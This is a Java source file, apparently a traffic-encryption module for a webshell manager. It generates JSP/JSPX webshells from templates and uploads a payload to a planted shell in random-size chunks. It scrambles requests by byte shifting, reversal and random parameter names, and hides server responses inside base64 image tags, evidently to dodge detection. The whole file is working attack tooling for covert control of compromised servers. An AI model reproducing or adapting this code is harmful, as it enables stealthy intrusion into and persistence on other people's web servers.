package shells.cryptions.JavaAes;

import core.ApplicationContext;
import core.Encoding;
import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import core.ui.component.dialog.GOptionPane;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Attributes;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import util.Log;
import util.functions;
import util.http.Http;

import javax.swing.*;
import java.awt.*;
import java.io.InputStream;
import java.net.URLEncoder;
import java.util.Random;

@CryptionAnnotation(
        Name = "JAVA_Reverse",
        payloadName = "JavaReversePayload"
)
public class JavaReverse implements Cryption {
    private int moveNum = 0;
    private ShellEntity shell;
    private Http http;
    private byte[] payload;

    private static final String[] SUFFIX = new String[]{"jsp", "jspx"};
    private boolean status; // inject payload success

    @Override
    public void init(ShellEntity shellEntity) {
        this.shell = shellEntity;
        this.http = this.shell.getHttp();
        this.moveNum = Integer.parseInt(this.shell.getPassword());
        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                try {
                    int start = 0;
                    int length = this.payload.length;
                    while (start < length){
                        start = sendChunkPayload(this.payload, start, length);
                        if (start == -1){
                            throw new Exception();
                        }
                    }
//                    byte[] result = functions.gzipD(this.http.sendHttpResponse(this.payload).getResult());
//                    String status = Encoding.getEncoding(this.shell).Decoding(result);
//                    if (status.equals("ok")) {
//                        this.status = true;
//                        this.state = true;
//                    } else {
//                        Log.error("payload Initialize Fail !");
//                    }
                } catch (Exception e) {
                    Log.error("payload Initialize Fail !");
                }
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Log.error(var4);
        }
    }

    private byte[] reverseByte(byte[] payloads) {

        int length = payloads.length;
        byte[] temp = new byte[length];

        for (int i = length - 1; i >= 0; i--) {
            temp[length - 1 - i] = payloads[i];
        }
        return temp;
    }

    private byte[] encodePayload(byte[] payloads) {
        int length = payloads.length;
        byte[] temp = new byte[length];
        for (int i = 0; i < length; i += 1) {
            temp[(i + this.moveNum) % length] = payloads[i];
        }
        return reverseByte(temp);
    }

    private static byte[] byteMergerAll(byte[]... values) {
        int length_byte = 0;
        for (int i = 0; i < values.length; i++) {
            length_byte += values[i].length;
        }
        byte[] all_byte = new byte[length_byte];
        int countLength = 0;
        for (int i = 0; i < values.length; i++) {
            byte[] b = values[i];
            System.arraycopy(b, 0, all_byte, countLength, b.length);
            countLength += b.length;
        }
        return all_byte;
    }


    private int sendChunkPayload(byte[] payloads, int start, int payloadsLength) {
        try {
            int length = new Random().nextInt(5000) + 10000;
            length = (length + start > payloadsLength) ? payloadsLength-start:length;
            int end = length + start;
            byte[] payload = new byte[length];
            System.arraycopy(payloads, start, payload, 0, payload.length);
            if (end == payloadsLength){
                byte[] result = this.http.sendHttpResponse(payload).getResult();
                String status = Encoding.getEncoding(this.shell).Decoding(result);
                if (status.equals("ok")) {
                    this.status = true;
//                    this.state = true;
                } else {
                    Log.error("payload Initialize Fail !");
                }
            }else{
                this.http.sendHttpResponse(payload);
            }
            return end;
        } catch (Exception e) {
        }
        return -1;

    }

    @Override
    public byte[] encode(byte[] data) {
        int length = new Random().nextInt(10) + 1;
        return (functions.getRandomString(length) + "=" + URLEncoder.encode(functions.base64EncodeToStringAndPadding(encodePayload(data), data.length/10))).getBytes();
    }

    @Override
    public byte[] decode(byte[] data) {
        try {
            StringBuffer sb = new StringBuffer();
            String result = new String(data, "utf-8").replace("\r\n", "");
            Document doc = Jsoup.parse(result);
            Elements imgs = doc.select("img[src]");
            for(Element element:imgs){
                try {
                    Attributes node = element.attributes();
                    sb.append(node.get("src").split(",")[1]);
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
            data = functions.base64Decode(sb.toString());
            return functions.gzipD(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    @Override
    public boolean isSendRLData() {
        return false;
    }

    @Override
    public byte[] generate(String s, String s1) {
        this.moveNum = Integer.parseInt(s);
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/reverseGlobalCode.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", s);
            inputStream = Generate.class.getResourceAsStream("template/reverseCode.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            Object selectedValue = GOptionPane.showInputDialog((Component)null, "suffix", "selected suffix", 1, (Icon)null, SUFFIX, (Object)null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                if (suffix.equals(SUFFIX[1])) {
                    globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                    code = code.replace("<", "&lt;").replace(">", "&gt;");
                }

                if (ApplicationContext.isGodMode()) {
                    template = template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code));
                } else {
                    template = template.replace("{globalCode}", globalCode).replace("{code}", code);
                }

                data = template.getBytes();
            }
        } catch (Exception var11) {
            Log.error(var11);
        }

        return data;
    }

    @Override
    public boolean check() {
        return false;
    }

    public boolean status() {
        return this.status;
    }
}
